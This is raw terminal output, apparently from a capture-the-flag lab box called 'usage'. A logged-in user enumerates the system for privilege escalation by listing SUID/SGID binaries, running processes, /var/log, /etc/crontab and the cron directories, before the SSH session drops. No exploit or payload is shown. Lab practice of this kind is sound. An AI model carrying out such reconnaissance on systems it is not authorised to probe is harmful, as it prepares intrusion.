-rwsr-xr-x 1 root root 59976 Feb  6 12:54 /usr/bin/passwd
-rwxr-sr-x 1 root tty 22920 Mar 22 12:25 /usr/bin/write.ul
-rwsr-xr-x 1 root root 55680 Mar 22 12:25 /usr/bin/su
-rwxr-sr-x 1 root shadow 23136 Feb  6 12:54 /usr/bin/expiry
-rwsr-xr-x 1 root root 44808 Feb  6 12:54 /usr/bin/chsh
-rwxr-sr-x 1 root shadow 72184 Feb  6 12:54 /usr/bin/chage
-rwsr-xr-x 1 root root 232416 Apr  3  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 47488 Mar 22 12:25 /usr/bin/mount
-rwxr-sr-x 1 root tty 22912 Mar 22 12:25 /usr/bin/wall
-rwsr-xr-x 1 root root 35200 Mar 22 12:25 /usr/bin/umount
-rwsr-xr-x 1 root root 72712 Feb  6 12:54 /usr/bin/chfn
-rwxr-sr-x 1 root crontab 39568 Mar 23  2022 /usr/bin/crontab
-rwxr-sr-x 1 root _ssh 293304 Jan  2 16:54 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 40496 Feb  6 12:54 /usr/bin/newgrp
-rwsr-xr-x 1 root root 35200 Mar 23  2022 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
-rwxr-sr-x 1 root shadow 22680 Jan 10 13:54 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 26776 Jan 10 13:54 /usr/sbin/unix_chkpwd
dash@usage:/var/log$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
dash        1270  0.0  0.1  66220  6684 ?        S    21:29   0:00 nginx: worker process
dash        1271  0.0  0.1  66496  7072 ?        S    21:29   0:01 nginx: worker process
dash        3181  0.0  0.2  17072  9912 ?        Ss   22:14   0:00 /lib/systemd/systemd --user
dash        3249  0.0  0.1   8788  5528 pts/1    Ss   22:14   0:00 -bash
dash        3717  0.0  0.1   8788  5608 pts/2    Ss+  22:29   0:00 -bash
dash        4211  0.0  0.0  84684  3468 ?        Sl   22:40   0:00 /usr/bin/monit
dash        4282  0.0  0.0  10072  1572 pts/1    R+   22:41   0:00 ps aux
dash@usage:/var/log$ cd /var/spool/cron/crontabs/
-bash: cd: /var/spool/cron/crontabs/: Permission denied
dash@usage:/var/log$ ls -la
total 1844
drwxrwxr-x  14 root      syslog            4096 Apr 25 21:29 .
drwxr-xr-x  14 root      root              4096 Apr  2 21:15 ..
-rw-r--r--   1 root      root               832 Apr 25 21:29 alternatives.log
drwxr-x---   2 root                    4   4096 Apr  8 12:16 apache2
drwxr-xr-x   2 root      root              4096 Apr  8 12:16 apt
drwxr-x---   2 root      adm               4096 Apr  8 12:18 audit
-rw-r-----   1 syslog    adm              12603 Apr 25 22:42 auth.log
-rw-r-----   1 syslog    adm               4653 Apr 25 21:29 auth.log.1
-rw-rw----   1 root      utmp                 0 Apr  8 12:18 btmp
drwxr-xr-x   2 clamav    clamav            4096 Apr  8 12:16 clamav
drwxr-xr-x   2 root      root              4096 Apr  2 21:15 dist-upgrade
-rw-r-----   1 root      adm                 67 Apr 25 21:29 dmesg
-rw-r-----   1 root      adm                 67 Apr  8 13:17 dmesg.0
-rw-r-----   1 root      adm                 95 Apr  8 12:35 dmesg.1.gz
-rw-r-----   1 root      adm                 95 Apr  8 12:18 dmesg.2.gz
drwxr-x---   4 root                    4   4096 Apr  8 12:16 installer
drwxr-sr-x+  3 root      systemd-journal   4096 Apr  2 21:15 journal
-rw-r-----   1 syslog    adm                755 Apr 25 22:35 kern.log
-rw-r-----   1 syslog    adm             624664 Apr 25 21:29 kern.log.1
drwxr-xr-x   2 landscape landscape         4096 Apr  8 12:20 landscape
-rw-rw-r--   1 root      utmp            292584 Apr 25 22:41 lastlog
drwxr-xr-x   2 _laurel   _laurel           4096 Apr 25 21:34 laurel
drwxr-x---   2 mysql     adm               4096 Apr 25 21:29 mysql
drwxr-xr-x   2 root      adm               4096 Apr 25 21:29 nginx
-rw-------   1 root      root               293 Apr 25 21:36 php8.1-fpm.log
-rw-------   1 root      root               846 Apr  8 13:18 php8.1-fpm.log.1
drwx------   2 root      root              4096 Apr  2 21:15 private
-rw-r-----   1 syslog    adm             247441 Apr 25 22:43 syslog
-rw-r-----   1 syslog    adm             825002 Apr 25 21:29 syslog.1
-rw-r--r--   1 root      root               193 Apr  8 13:17 vmware-network.1.log
-rw-r--r--   1 root      root               193 Apr  8 12:35 vmware-network.2.log
-rw-r--r--   1 root      root               193 Apr  8 12:18 vmware-network.3.log
-rw-r--r--   1 root      root               195 Apr 25 21:29 vmware-network.log
-rw-------   1 root      root              3320 Apr  8 13:19 vmware-vmsvc-root.1.log
-rw-------   1 root      root              3320 Apr  8 12:40 vmware-vmsvc-root.2.log
-rw-------   1 root      root              3320 Apr  8 12:22 vmware-vmsvc-root.3.log
-rw-------   1 root      root              6359 Apr 25 21:29 vmware-vmsvc-root.log
-rw-------   1 root      root              2304 Apr 25 21:29 vmware-vmtoolsd-root.log
-rw-rw-r--   1 root      utmp             10752 Apr 25 22:41 wtmp
dash@usage:/var/log$ cd /var/spool/cron/crontabs/dash
-bash: cd: /var/spool/cron/crontabs/dash: Permission denied
dash@usage:/var/log$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
dash@usage:/var/log$ cd /etc
dash@usage:/etc$ ls
adduser.conf                   dhcp             kernel          modules-load.d       profile.d      sudo.conf
alternatives                   dpkg             landscape       monit                protocols      sudoers
apache2                        e2scrub.conf     laurel          mtab                 python3        sudoers.d
apparmor                       emacs            ldap            multipath            python3.10     sudo_logsrvd.conf
apparmor.d                     environment      ld.so.cache     multipath.conf       rc0.d          sysctl.conf
apport                         environment.d    ld.so.conf      mysql                rc1.d          sysctl.d
apt                            ethertypes       ld.so.conf.d    nanorc               rc2.d          systemd
audit                          fonts            legal           needrestart          rc3.d          terminfo
bash.bashrc                    fstab            libaudit.conf   netconfig            rc4.d          thermald
bash_completion                fuse.conf        libblockdev     netplan              rc5.d          timezone
bash_completion.d              fwupd            libnl-3         network              rc6.d          tmpfiles.d
bindresvport.blacklist         gai.conf         lighttpd        networkd-dispatcher  rcS.d          ubuntu-advantage
binfmt.d                       groff            locale.alias    NetworkManager       resolv.conf    ucf.conf
byobu                          group            locale.gen      networks             rmt            udev
ca-certificates                group-           localtime       newt                 rpc            udisks2
ca-certificates.conf           grub.d           logcheck        nftables.conf        rsyslog.conf   ufw
ca-certificates.conf.dpkg-old  gshadow          login.defs      nginx                rsyslog.d      update-manager
cloud                          gshadow-         logrotate.conf  nsswitch.conf        screenrc       update-motd.d
console-setup                  gss              logrotate.d     opt                  security       update-notifier
cron.d                         hdparm.conf      lsb-release     os-release           selinux        UPower
cron.daily                     host.conf        lvm             overlayroot.conf     sensors3.conf  usb_modeswitch.conf
cron.hourly                    hostname         machine-id      PackageKit           sensors.d      usb_modeswitch.d
cron.monthly                   hosts            magic           pam.conf             services       vim
crontab                        hosts.allow      magic.mime      pam.d                shadow         vmware-tools
cron.weekly                    hosts.deny       mailcap         passwd               shadow-        vtrgb
cryptsetup-initramfs           init             mailcap.order   passwd-              shells         wgetrc
crypttab                       init.d           manpath.config  perl                 skel           X11
dbus-1                         initramfs-tools  mdadm           php                  sos            xattr.conf
dconf                          inputrc          mecabrc         pki                  ssh            xdg
debconf.conf                   iproute2         mime.types      pm                   ssl            zsh_command_not_found
debian_version                 iscsi            mke2fs.conf     polkit-1             subgid
default                        issue            ModemManager    pollinate            subgid-
deluser.conf                   issue.net        modprobe.d      ppp                  subuid
depmod.d                       java-11-openjdk  modules         profile              subuid-
dash@usage:/etc$ which python
dash@usage:/etc$ cd cron.hourly/
dash@usage:/etc/cron.hourly$ ls -la
total 12
drwxr-xr-x   2 root root 4096 Feb 17  2023 .
drwxr-xr-x 114 root root 4096 Apr  8 12:21 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
dash@usage:/etc/cron.hourly$ cd ..
dash@usage:/etc$ cd cron.daily/
dash@usage:/etc/cron.daily$ ls -la
total 36
drwxr-xr-x   2 root root 4096 Apr  2 19:28 .
drwxr-xr-x 114 root root 4096 Apr  8 12:21 ..
-rwxr-xr-x   1 root root  539 May  3  2023 apache2
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat
-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
-rwxr-xr-x   1 root root  377 May 25  2022 logrotate
-rwxr-xr-x   1 root root 1330 Mar 17  2022 man-db
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
dash@usage:/etc/cron.daily$ client_loop: send disconnect: Broken pipe
                                                                                                                              
┌──(kali㉿kali)-[~/thm/usage]
└─$ 

```